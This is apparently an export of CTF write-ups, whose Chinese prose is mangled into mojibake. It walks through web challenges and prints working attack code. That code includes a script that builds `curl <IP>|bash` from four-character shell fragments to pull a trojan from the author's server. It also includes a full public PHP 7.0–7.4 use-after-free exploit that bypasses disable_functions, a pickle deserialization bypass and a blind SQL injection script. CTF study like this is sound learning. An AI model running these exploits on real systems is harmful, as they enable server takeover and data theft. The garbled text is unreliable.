if (isset($_POST['url'])) { $url = $_POST['url']; if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match('/(data:\\/\\/)|(&amp;)|(\\|)|(\\.\\/)/i', $url)) { echo \"you are hacker\"; } else { $res = parse_url($url); if (preg_match('/127\\.0\\.0\\.1$/', $res['host'])) { $code = file_get_contents($url); if (strlen($code) &lt;= 4) { @exec($code); } else { echo \"try again\"; } } } } else { echo \"invalid url\"; } } else { highlight_file(__FILE__); }} else { die('åªæœ‰ç®¡ç†å‘˜æ‰èƒ½çœ‹åˆ°æˆ‘å“Ÿ');} å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨urlè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå¹¶ä¸”data://è¢«banäº†ï¼Œè¿™é‡Œæƒ³åˆ°äº†ByteCTFä¸€é“é¢˜çš„ç»•è¿‡å§¿åŠ¿ï¼Œå…ˆæ”¾è¿™ï¼Œurlä¸­éœ€è¦æœ‰127.0.0.1æ‰èƒ½è¿›ä¸€æ­¥æ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥å‚è€ƒå¦‚ä½•ç»•è¿‡URLé™åˆ¶è¿™ç¯‡æ–‡ç« ï¼Œè¿™é‡Œç”¨@æ¥ç»•è¿‡ï¼Œç„¶ååˆ©ç”¨compress.zlib://æ¥æ»¡è¶³file_get_contentså‡½æ•°çš„è¯»å–ï¼ŒæˆåŠŸè¿‡ä¸€å¡ã€‚ 'url':'compress.zlib://data:@127.0.0.1/plain;base64,' æ­£å…¥ä¸‡å±±åœˆå­é‡Œå•Šâ€¦è¿˜è¦è¦æ±‚æ‰§è¡Œçš„å‘½ä»¤é•¿åº¦ä¸èƒ½è¶…è¿‡4â€¦æƒ³åˆ°äº†HITCONçš„ä¸€é“é¢˜ï¼Œç»•è¿‡å››å­—ç¬¦é™åˆ¶getshellï¼Œä¹Ÿå°±æ˜¯é€šè¿‡æŠŠå‘½ä»¤æ‹†è§£æˆå››å­—ç¬¦ä¸€ç»„æ¥æ‰§è¡Œå‘½ä»¤ã€‚ åˆ©ç”¨å‘½ä»¤çš„æ‰§è¡Œåˆ°VPSä¸Šä¸‹è½½æœ¨é©¬ï¼Œç„¶åæˆ‘ä»¬å°±èƒ½æ‹¿åˆ°shelläº†ï¼ ç†ä¸€ä¸‹è§£é¢˜æ€è·¯ 1ã€åˆ©ç”¨PHP sessionçš„ååºåˆ—åŒ–æ¼æ´æˆä¸ºadminï¼Œè¯»å–/core/index.phpå…³é”®ä»£ç  2ã€åˆ©ç”¨URLç»•è¿‡å§¿åŠ¿ç»•è¿‡å¯¹urlçš„é™åˆ¶ 3ã€åˆ©ç”¨compress.zlib:è¿›è¡Œfile_get_contentså¯¹æ–‡ä»¶çš„è¯»å– 4ã€ç»•è¿‡å››å­—ç¬¦é™åˆ¶getshell è§£é¢˜å…³äºè§£é¢˜çš„ç¬¬å››æ­¥è¿˜æ˜¯è¦å¥½å¥½è¯´ä¸€ä¸‹çš„ï¼Œä¸ºäº†ä¸‹è½½æœ¨é©¬ï¼Œæˆ‘æŠŠè‡ªå·±çš„åšå®¢éƒ½åˆ äº†â€¦ å› ä¸ºæ˜¯ç”¨curlå‘½ä»¤æ¥åˆ°VPSä¸Šè¯»å–æœ¨é©¬çš„ä»£ç ï¼Œå› æ­¤åœ¨VPSä¸Šé…ç½®å¥½æœ¨é©¬æ–‡ä»¶å¾ˆé‡è¦ï¼Œåšé¢˜çš„æ—¶å€™è¿™é‡Œå°±å¡äº†å¾ˆä¹…ï¼Œè¿™ä¸€æ­¥ä¹Ÿéœ€è¦åœ¨æœ¬åœ°å¥½å¥½æµ‹è¯•ï¼Œä¿è¯æœ¨é©¬æ–‡ä»¶èƒ½æˆåŠŸè®¿é—®ã€‚ åœ¨VPSä¸Šé…ç½®å¥½æœ¨é©¬æ–‡ä»¶ä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡urlä¼ å‚é€šè¿‡å››å­—ç¬¦æ‰§è¡Œå‘½ä»¤æ¥ä¸‹è½½æœ¨é©¬ï¼Œç„¶åæµè§ˆå™¨æ‹¿shelläº†ã€‚ å®Œæ•´çš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š #encoding=utf-8import requestsfrom time import sleepfrom urllib import quoteimport base64s = requests.session()url = \"http://121.36.222.22:88/login.php\"s.post(url, data={'name':'ggb0n'})url1 = \"http://121.36.222.22:88/?page=upload\"s.post(url1, data={'sign':'ggb0n|O:4:\"info\":2:{s:5:\"admin\";i:1;s:4:\"sign\";s:0:\"\";}'})url3 = \"http://121.36.222.22:88/core/index.php\"s.get(url3)ip = 'xx.xx.xx.xx'ip = '0x' + ''.join([str(hex(int(i))[2:].zfill(2)) for i in shell_ip.split('.')])payload = [ # å°† \"g&gt; ht- sl\" å†™åˆ°æ–‡ä»¶ \"v\" '&gt;dir', '&gt;sl', '&gt;g\\&gt;', '&gt;ht-', '*&gt;v', # å°†æ–‡ä»¶\"v\"ä¸­çš„å­—ç¬¦ä¸²å€’åºï¼Œæ”¾åˆ°æ–‡ä»¶\"x\"ï¼Œå°±å˜æˆäº† \"ls -th &gt;g\" '&gt;rev', '*v&gt;x', # generate `curl orange.tw.tw|python` # generate `curl 10.188.2.20|bash` '&gt;p\\ ', '&gt;ph\\\\', '&gt;a.\\\\', '&gt;\\&gt;\\\\', '&gt;%s\\\\' % ip[8:10], '&gt;%s\\\\' % ip[6:8], '&gt;%s\\\\' % ip[4:6], '&gt;%s\\\\' % ip[2:4], '&gt;%s\\\\' % ip[0:2], '&gt;\\ \\\\', '&gt;rl\\\\', '&gt;cu\\\\', # getshell 'sh x', 'sh g', ]payload_all = 'compress.zlib://data:@127.0.0.1/plain;base64,{0}'r = requests.get(url3)for i in payload: r = requests.post(url3,data={\"url\":payload_all.format(base64.b64encode(i))}) print r.text print(data['url']) sleep(0.5) ä¸‹è½½æœ¨é©¬ä¹‹åï¼Œæµè§ˆå™¨æ‹¿shellï¼š æ•´ç†ä¸€ä¸‹å‚è€ƒçš„æ–‡ç« ï¼šhttps://www.cnblogs.com/hf99/p/9746038.htmlhttps://xz.aliyun.com/t/6640#toc-10https://www.anquanke.com/post/id/87203 webtmpè€ƒå¯Ÿpickleçš„ååºåˆ—åŒ–åˆ©ç”¨ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›® å¯ä»¥è¯»æºç ï¼š import base64import ioimport sysimport picklefrom flask import Flask, Response, render_template, requestimport secretapp = Flask(__name__)class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f'Animal(name={self.name!r}, category={self.category!r})' def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.categoryclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == '__main__': return getattr(sys.modules['__main__'], name) raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name))def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load()def read(filename, encoding='utf-8'): with open(filename, 'r', encoding=encoding) as fin: return fin.read()@app.route('/', methods=['GET', 'POST'])def index(): if request.args.get('source'): return Response(read(__file__), mimetype='text/plain') if request.method == 'POST': try: pickle_data = request.form.get('data') if b'R' in base64.b64decode(pickle_data): return 'No... I don\\'t like R-things. No Rabits, Rats, Roosters or RCEs.' else: result = restricted_loads(base64.b64decode(pickle_data)) if type(result) is not Animal: return 'Are you sure that is an animal???' correct = (result == Animal(secret.name, secret.category)) return render_template('unpickle_result.html', result=result, pickle_data=pickle_data, giveflag=correct) except Exception as e: print(repr(e)) return \"Something wrong\" sample_obj = Animal('ä¸€ç»™æˆ‘å“©giaogiao', 'Giao') pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode() return render_template('unpickle_page.html', sample_obj=sample_obj, pickle_data=pickle_data)if __name__ == '__main__': app.run(host='0.0.0.0', port=5000) åŸºäºflaskçš„ç¯å¢ƒï¼Œå¹¶ä¸”é‡‡ç”¨äº†pickle ç»“åˆé¢˜ç›®æè¿°ï¼š Sample animal: Animal(name=â€™ä¸€ç»™æˆ‘å“©giaogiaoâ€™, category=â€™Giaoâ€™) Pickled data: gANjX19tYWluX18KQW5pbWFsCnEAKYFxAX1xAihYBAAAAG5hbWVxA1gUAAAA5LiA57uZ5oiR5ZOpZ2lhb2dpYW9xBFgIAAAAY2F0ZWdvcnlxBVgEAAAAR2lhb3EGdWIu I will give you the flag if we share the same animal as our favourite. å¯çŸ¥ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªä¸é¢˜ç›®secretä¸­ä¸€æ ·çš„Animalç±»æ‰èƒ½æ‹¿åˆ°flagï¼Œå‘½ä»¤æ‰§è¡Œæ˜¯ä¸èƒ½çš„ï¼Œå› ä¸ºRè¢«banäº†ï¼Œæˆ‘ä»¬åˆä¸å¯èƒ½çŸ¥é“secretä¸­Animalçš„å±æ€§å€¼ã€‚ ä½†æ˜¯ä»è¿™ç¯‡æ–‡ç« å¾—åˆ°äº†æç¤ºï¼šå­˜åœ¨bè¿™ä¸ªæŒ‡ä»¤ï¼ˆcall __setstate__ or__dict__.update()ï¼‰ï¼Œå¯ä»¥æ›´æ–°å­—å…¸ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥å…ˆè¦†ç›–secretä¸­åŸæœ‰çš„å€¼ï¼Œç„¶åå†™å…¥æˆ‘ä»¬æ„é€ çš„é”®å€¼å¯¹åˆ°å­—å…¸ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å†æ„é€ Animalç±»æ»¡è¶³é¢˜ç›®è¦æ±‚ï¼ŒæˆåŠŸæ‹¿åˆ°flagäº†ã€‚ å‚è€ƒä¸Šé¢é‚£ç¯‡æ–‡ç« çš„æŒ‡ä»¤é›†ï¼Œæ„é€ äº†å¦‚ä¸‹çš„åºåˆ—åŒ–æŒ‡ä»¤ï¼š c__main__\\nsecret\\np0\\n(dp1\\nS'category'\\np2\\nS'ggb0n'\\np3\\nsS'name'\\np4\\nS'ggb0n'\\np5\\nsb. æ³¨æ„è¿™é‡Œçš„\\næ¢è¡Œç¬¦ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå·¨å‘â€¦åˆšå¼€å§‹åœ¨Windowsä¸‹æ„é€ çš„payloadçš„base64ä¹‹åæäº¤åé¦ˆSomethin wrongï¼Œåæ¥ç»å¸ˆå‚…æç¤ºè¯´pickleå¯¹æ¢è¡Œç¬¦çš„\\rä¸èƒ½è¯†åˆ«â€¦æ¶¨çŸ¥è¯†â€¦ ä¸¤ç§æ–¹æ³•ï¼š 1ã€å­—ç¬¦ä¸²å¯¹è±¡.replaceAll(&quot;\\r&quot;, &quot;&quot;); 2ã€åˆ°Linuxä¸­å»åŠ å¯† é€‰æ‹©äº†å»Linuxä¸­åŠ å¯†ï¼š #æ³¨æ„åœ¨Linuxä¸‹&gt;&gt;&gt; import base64&gt;&gt;&gt; s = \"c__main__\\nsecret\\np0\\n(dp1\\nS'category'\\np2\\nS'ggb0n'\\np3\\nsS'name'\\np4\\nS'ggb0n'\\np5\\nsb.\"&gt;&gt;&gt; a = base64.b64encode(s)&gt;&gt;&gt; a'Y19fbWFpbl9fCnNlY3JldApwMAooZHAxClMnY2F0ZWdvcnknCnAyClMnZ2diMG4nCnAzCnNTJ25hbWUnCnA0ClMnZ2diMG4nCnA1CnNiLg==' ç„¶ååœ¨æœ¬åœ°ç”Ÿæˆä¸ªAnimalå¯¹è±¡ï¼š import pickleimport base64class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return \"Animal\" def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.categoryif __name__ == '__main__': a = Animal('ggb0n','ggb0n') print(base64.b64encode(pickle.dumps(a))) ç°å°†ç¬¬ä¸€ä¸ªpayloadçš„base64é€šè¿‡è¾“å…¥æ¡†æäº¤ååºåˆ—åŒ–æ‰§è¡Œè¦†ç›–å­—å…¸ï¼Œç„¶åå†æäº¤æˆ‘ä»¬æ„é€ çš„Animalå¯¹è±¡çš„base64ï¼Œå³å¯æ‹¿åˆ°flagï¼š å‚è€ƒæ–‡ç« ï¼šhttps://www.anquanke.com/post/id/188981#h3-8http://blog.nsfocus.net/%e7%bb%95%e8%bf%87-restrictedunpickler/ PHP-UAFè€ƒå¯Ÿfunctions_disableçš„ç»•è¿‡ï¼Œä¸Šæ¬¡Iæ˜¥ç§‹å…¬ç›Šèµ›easy_thinkingåˆšé‡åˆ°çš„çŸ¥è¯†ç‚¹ï¼Œå‰ä¸¤å¤©åœ¨CTFHubä¸Šä¹Ÿåœ¨åˆ·è¿™æ–¹é¢çš„é¢˜ã€‚ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ç›´æ¥ç»™äº†å°é©¬ï¼š &lt;?php$sandbox = '/var/www/html/sandbox/' . md5(\"wdwd\" . $_SERVER['REMOTE_ADDR']);@mkdir($sandbox);@chdir($sandbox);if (isset($_REQUEST['cmd'])) { @eval($_REQUEST['cmd']);}highlight_file(__FILE__); å…ˆçœ‹ä¸€ä¸‹phpinfoï¼š æ˜¯PHP 7ç‰ˆæœ¬çš„ï¼Œæœ‰ä¸€ä¸ªbypassä»£ç å¯ä»¥ç”¨ï¼Œåœ¨è¿™é‡Œã€‚ ç„¶åçœ‹ä¸€ä¸‹functions_disableæœç„¶banæ‰äº†å¾ˆå¤šå‡½æ•°ï¼š é‚£ä¹ˆæ€è·¯å°±æœ‰äº†ï¼š 1ã€èšå‰‘è¿æ¥ï¼Œä¸Šä¼ bypassè„šæœ¬ 2ã€æµè§ˆå™¨è®¿é—®ï¼Œè·å–shell è§£é¢˜å°†å¦‚ä¸‹çš„bypassè„šæœ¬ä¸Šä¼ ï¼ˆä¸Šæ¬¡çš„bypassè„šæœ¬ç”¨ä¸äº†â€¦ï¼‰ï¼š &lt;?php# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=76047# debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability.## This exploit should work on all PHP 7.0-7.4 versions# released as of 30/01/2020.## Author: https://github.com/mm0r1pwn(\"uname -a\");function pwn($cmd) { global $abc, $helper, $backtrace; class Vuln { public $a; public function __destruct() { global $backtrace; unset($this-&gt;a); $backtrace = (new Exception)-&gt;getTrace(); # ;) if(!isset($backtrace[1]['args'])) { # PHP &gt;= 7.4 $backtrace = debug_backtrace(); } } } class Helper { public $a, $b, $c, $d; } function str2ptr(&amp;$str, $p = 0, $s = 8) { $address = 0; for($j = $s-1; $j &gt;= 0; $j--) { $address &lt;&lt;= 8; $address |= ord($str[$p+$j]); } return $address; } function ptr2str($ptr, $m = 8) { $out = \"\"; for ($i=0; $i &lt; $m; $i++) { $out .= chr($ptr &amp; 0xff); $ptr &gt;&gt;= 8; } return $out; } function write(&amp;$str, $p, $v, $n = 8) { $i = 0; for($i = 0; $i &lt; $n; $i++) { $str[$p + $i] = chr($v &amp; 0xff); $v &gt;&gt;= 8; } } function leak($addr, $p = 0, $s = 8) { global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-&gt;a); if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; } return $leak; } function parse_elf($base) { $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i &lt; $e_phnum; $i++) { $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec $text_size = $p_memsz; } } if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; } function get_basic_funcs($base, $elf) { list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i &lt; $data_size / 8; $i++) { $leak = leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) { $deref = leak($leak); # 'constant' constant check if($deref != 0x746e6174736e6f63) continue; } else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) { $deref = leak($leak); # 'bin2hex' constant check if($deref != 0x786568326e6962) continue; } else continue; return $data_addr + $i * 8; } } function get_binary_base($binary_leak) { $base = 0; $start = $binary_leak &amp; 0xfffffffffffff000; for($i = 0; $i &lt; 0x1000; $i++) { $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) { # ELF header return $addr; } } } function get_system($basic_funcs) { $addr = $basic_funcs; do { $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) { # system return leak($addr + 8); } $addr += 0x20; } while($f_entry != 0); return false; } function trigger_uaf($arg) { # str_shuffle prevents opcache string interning $arg = str_shuffle(str_repeat('A', 79)); $vuln = new Vuln(); $vuln-&gt;a = $arg; } if(stristr(PHP_OS, 'WIN')) { die('This PoC is for *nix systems only.'); } $n_alloc = 10; # increase this value if UAF fails $contiguous = []; for($i = 0; $i &lt; $n_alloc; $i++) $contiguous[] = str_shuffle(str_repeat('A', 79)); trigger_uaf('x'); $abc = $backtrace[1]['args'][0]; $helper = new Helper; $helper-&gt;b = function ($x) { }; if(strlen($abc) == 79 || strlen($abc) == 0) { die(\"UAF failed\"); } # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) { die(\"Couldn't determine binary base address\"); } if(!($elf = parse_elf($base))) { die(\"Couldn't parse ELF header\"); } if(!($basic_funcs = get_basic_funcs($base, $elf))) { die(\"Couldn't get basic_functions address\"); } if(!($zif_system = get_system($basic_funcs))) { die(\"Couldn't get zif_system address\"); } # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i &lt; 0x110; $i += 8) { write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); } # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-&gt;b)($cmd); exit();}?&gt; ä½†æ˜¯webç›®å½•æ²¡æœ‰ä¸Šä¼ æƒé™â€¦è¿™æ—¶å€™å‘ç°webç›®å½•ä¸‹å­˜åœ¨sandboxæ–‡ä»¶å¤¹ï¼Œè¿™é‡Œå¯ä»¥ä¸Šä¼ ï¼Œniceï¼ ç„¶ååˆ°æµè§ˆå™¨è®¿é—®/sandbox/bypass7x.phpï¼Œä½†æ˜¯ä¸€ç›´ä¸èƒ½è®¿é—®â€¦ ä½†æ˜¯æˆ‘ä»¬æœ‰å°é©¬å‘¢ï¼Œç”¨å°é©¬åŒ…å«ä¸€ä¸‹è¯•è¯• ?cmd=include(\"sandbox/bypass7x.php\"); å‘ç°æˆåŠŸæ‰§è¡Œï¼š ç„¶åæˆ‘ä»¬é‚£æ‰§è¡Œçš„å‘½ä»¤æ”¹ä¸º/readflagï¼Œå³å¯æ‹¿åˆ°flagï¼š è¿™é¢˜çš„æœ€åä¸å¾—ä¸è¯´â€¦æ…å±çœŸçˆ½ï¼Œä¸è¿‡æœ‰ç‚¹å¯è€»ã€‚ DAY 2å‰©ä¸‹çš„é¢˜ç›®éƒ½æ˜¯é«˜éš¾åº¦äº†ï¼Œå°±å‡ºäº†åŠä¸ªé¢˜â€¦ nwebè€ƒå¯Ÿsqlç›²æ³¨+ä¼ªé€ mysql-serverå®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¿™æ¬¡æ˜¯çœŸå¿ƒä½“ä¼šåˆ°ï¼Œä»¥åç›²æ³¨è„šæœ¬è¿˜æ˜¯ç”¨asciiç å§ï¼Œåšå†³ä¸ç”¨å­—æ¯è¡¨äº†â€¦ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ï¼Œå‘ç°å¯ä»¥æ³¨å†Œç™»å½•ï¼Œç™»é™†ä¸Šä¹‹åflagé¡µé¢è®¿é—®æ— æƒé™ï¼Œåœ¨è¯„è®ºåŒºçœ‹åˆ°äº†å¦‚ä¸‹çš„æç¤ºï¼š çŒœæµ‹æ³¨å†Œè´¦æˆ·çš„æ—¶å€™å¯èƒ½å­˜åœ¨é—®é¢˜ï¼Œé‡æ–°æ³¨å†Œï¼ŒæŠ“åŒ…å‘ç°å­˜åœ¨typeå‚æ•°ï¼Œå¹¶ä¸”è¢«ç½®ä¸º0ï¼š é‚£è¿™ä¸ªå‚æ•°åº”è¯¥å°±æ˜¯ä¸ç­‰çº§æœ‰å…³äº†ï¼Œåæ¥åœ¨æ³¨å†Œé¡µé¢çœ‹åˆ°æç¤ºï¼š å†æ¬¡æŠ“åŒ…æ›´æ”¹type=110ï¼Œç™»å½•å†æ¬¡è®¿é—®flagé¡µï¼Œå‘ç°å¯ä»¥æœç´¢flagäº†ï¼š æœç´¢çš„é¡µé¢æ˜¯search.phpï¼Œæ³¨å…¥ç‚¹è‚¯å®šå°±æ˜¯åœ¨è¿™ä¸ªé¡µé¢äº†ï¼Œå‚æ•°æ˜¯flagï¼Œç»è¿‡FUZZå‘ç°ï¼Œunionè¢«banï¼Œselectã€froméœ€è¦åŒå†™ç»•è¿‡ï¼ŒæŸ¥çœ‹æœç´¢çš„å›æ˜¾å‘ç°ï¼Œè¯­å¥é”™è¯¯åé¦ˆThere is no flagï¼Œè¯­å¥æ­£ç¡®åé¦ˆThere is flag!è‚¯å®šæ˜¯ç›²æ³¨äº†ï¼Œæ‹¿ä¸Šæ¬¡Iæ˜¥ç§‹æˆ˜â€œç–«â€èµ›çš„ç›²æ³¨è„šæœ¬æ”¹äº†ä¸€ä¸‹ï¼š import requestsurl = 'http://121.37.179.47:1001/search.php'headers = {\"Cookie\": \"PHPSESSID=b2olm04l72i9v25s1orvb28253; username=8837cc3dd80b62a3b5bab3ff2dc91469\"}#payload = \"-1' or (ascii(mid((selselectect database()),{0},1))={1})#\"#payload = \"-1' or (ascii(mid((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database()),{0},1))={1})#\"#payload = \"-1' or (ascii(mid((selselectect group_concat(column_name) frfromom information_schema.columns where table_name='admin'),{0}ï¼Œ1))={1})#\"payload = \"-1' or (ascii(mid((selselectect * frfromom fl4g),{0},1))={1})#\"database = ''for i in range(1, 80): for n in range(30,127): #æ³¨æ„è¿™é‡Œæœ‰æ—¶å€™å¯¼è‡´æ•ˆç‡å¾ˆä½ data = { \"flag\": payload.format(i, n), } req = requests.post(url, data=data,headers=headers) if \"There is flag\" in req.text: database += chr(n) print(database) break mysqlä¸åŒºåˆ†å¤§å°å†™ï¼Œå°±æ˜¯è¯´å¦‚æœaä¸å­˜åœ¨ï¼Œä¼šç”¨Aå»åŒ¹é…aâ€¦å†™ç›²æ³¨è„šæœ¬ï¼Œå¦‚æœç”¨å­—æ¯è¡¨çš„è¯ï¼Œè¿™å°±æ˜¯ä¸ªå·¨å‘ï¼è¿˜æ˜¯ç”¨asciiç é è°±ï¼Œä¸è¿‡asciiä¼šåŒ¹é…è¾ƒå¤šçš„å­—ç¬¦ï¼Œçˆ†ç ´é€Ÿåº¦æœ‰æ—¶å€™ä¼šå¾ˆæ…¢ï¼Œå¯èƒ½å› ä¸ºå¾ˆå¤šå­—ç¬¦è¯·æ±‚è®©æœåŠ¡å™¨500å¯¼è‡´çš„â€¦è¿™ä¸€ç‚¹è·‘è„šæœ¬çš„æ—¶å€™æ”¹äº†åŠå¤©â€¦è¿˜æ˜¯tcl è·‘å‡ºåº“åï¼šctf-2è¡¨åï¼šadminã€fl4gã€jdã€userç›´æ¥åˆ°fl4gè¡¨è·‘flagï¼Œè·‘äº†å‡ æ¬¡éƒ½æ²¡æœ‰è·‘å‡ºå®Œæ•´çš„flagï¼š åæ¥ç»é˜Ÿå‹æç¤ºï¼Œflagå¯èƒ½æ˜¯åˆ†å¼€å­˜æ”¾çš„ï¼Œæ•°æ®åº“å¯èƒ½åªæœ‰éƒ¨åˆ†flagã€‚äºæ˜¯æƒ³åˆ°è¿˜æœ‰adminè¡¨å¯ä»¥å»æŸ¥ç®¡ç†å‘˜å¯†ç ï¼Œç”¨è„šæœ¬è·‘å‡ºå¯†ç e2ecea8b80a96fb07f43a2f83c8b0960ï¼Œmd5è§£å¯†ä¸€ä¸‹å¾—åˆ°whoamiadminï¼Œæ‹¿å»ç”¨admin/whoamiadminç™»å½•å´è¯´ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯â€¦åŠå¤©éƒ½ä¸è¡Œâ€¦ç¡äº†ç¡äº† DAY3é†’æ¥å‘ç°flagå·²ç»è¢«é˜Ÿå‹äº¤äº†ï¼Œå¯†ç å°±æ˜¯é‚£ä¸ªï¼Œåº”è¯¥æ˜¯ç¯å¢ƒå‡ºé—®é¢˜äº†â€¦é‚£ä¹ˆå†æ¥å­¦ä¹ ä¸€ä¸‹ã€‚ ç®¡ç†å‘˜ç™»å½•ä¹‹åï¼š æ ¹æ®å‰åŠéƒ¨åˆ†flagï¼Œæƒ³åˆ°æ˜¯mysqlèœœç½ä»»æ„è¯»å–æ–‡ä»¶å‚è€ƒè¿™é‡Œï¼Œå‚è€ƒgithubä¸Šå¤§å¸ˆå‚…å†™çš„è„šæœ¬ï¼Œæ”¾åœ¨VPSä¸Šç›‘å¬ï¼Œç„¶ååœ¨æµè§ˆå™¨å¡«å…¥VPSåœ°å€å’Œç«¯å£ï¼Œåˆ©ç”¨æ„é€ çš„mysqlèœœç½è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–flag.phpï¼Œå°±èƒ½æ‹¿åˆ°å®Œæ•´çš„flagäº†ã€‚ èµ›é¢˜ç¯å¢ƒæ²¡äº†ï¼Œæš‚æ—¶æ²¡æ³•å¤ç°äº†ï¼ŒçŸ¥é“åŸç†ï¼Œå›å¤´å†è¯•å§ã€‚","link":"/2020/03/07/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"},{"title":"CTFHub-bypass_functions_disable","text":"ä¸å¾—ä¸è¯´ï¼ŒLineå¸ˆå‚…ä»¬åœ¨æŠ€èƒ½æ ‘é‡Œå®‰æ’çš„è¿™ä¸ªåˆ†æ”¯çœŸæ˜¯å¤ªæ£’äº†ï¼ä½œä¸ºä¸€åèœé¸¡ï¼Œä¹‹å‰åªæ˜¯å¯¹bypass functions_disableæœ‰æ¯”è¾ƒå°‘å¹¶ä¸”ä¸æ¸…æ™°çš„ç†è§£ï¼Œä½†æ˜¯åˆ·äº†è¿™éƒ¨åˆ†é¢˜ç›¸å½“äºç³»ç»Ÿåœ°å­¦ä¹ äº†ä¸€éï¼Œå¸®åŠ©å¾ˆå¤§ï¼ ç°åœ¨çš„webé¢˜ä¸­functions_disableå¾ˆå¸¸è§ï¼Œå¾ˆå¤šæ—¶å€™éƒ½ä¼šè‹¦äºå°é©¬ä¸Šä¼ ã€èšå‰‘è¿ä¸Šä¹‹åä¸èƒ½è¯»flagæ–‡ä»¶å†…å®¹ã€ç»ˆç«¯ä¹Ÿæ‰§è¡Œä¸äº†å‘½ä»¤â€¦è¿™ä¸ªæ—¶å€™å°±è‚¯å®šæ˜¯è¿›è¡Œäº†functions_disableï¼Œéœ€è¦æˆ‘ä»¬å°è¯•å„ç§å§¿åŠ¿æ¥bypassäº†ã€‚ é€šè¿‡è¿™ç¯‡åšå®¢ï¼Œå¥½å¥½è®°å½•ä¸€ä¸‹å„ç§ç»•è¿‡å§¿åŠ¿çš„å­¦ä¹ ã€‚ LD_PRELOADä¸»è¦è€ƒå¯Ÿåˆ©ç”¨Linuxçš„ç¯å¢ƒå˜é‡LD_PRELOADæ¥è¿›è¡Œfunctions_disableçš„bypassã€‚ å…³äºåˆ©ç”¨LD_PRELOAD bypass LD_PRELOADæ˜¯ä¸è½½å…¥å‡½æ•°åº“ç›¸å…³çš„ç¯å¢ƒå˜é‡,å®ƒçš„ä½œç”¨ä¾¿æ˜¯åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½æŒ‡å®šçš„å‡½æ•°åº“ã€‚ æ¯ä¸ªç¨‹åºæ‰§è¡Œçš„æ—¶å€™ä¼šå»åŠ¨æ€é“¾æ¥åº“soæ–‡ä»¶é‡Œé¢æ‰¾å‡½æ•°çš„ä½ç½®ï¼Œè€Œæˆ‘ä»¬çš„ç›®çš„æ˜¯è®©ç¨‹åºå»æ‰§è¡Œæˆ‘ä»¬è‡ªå®šä¹‰çš„åŠ¨æ€é“¾æ¥åº“ï¼Œè¿™æ ·å°±ç›¸å½“äºåœ¨æ­£å¸¸ç¨‹åºä¸­è¿›è¡Œfunction_disableç¦ç”¨è¯¸å¦‚systemä¹‹å‰ä¾¿æ‰§è¡Œäº†ç³»ç»Ÿå‘½ä»¤ã€‚ ç»“åˆä¸Šè¿°ä¸¤ç‚¹ï¼Œæˆ‘ä»¬å°±å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ªsoæ–‡ä»¶ä¸Šä¼ 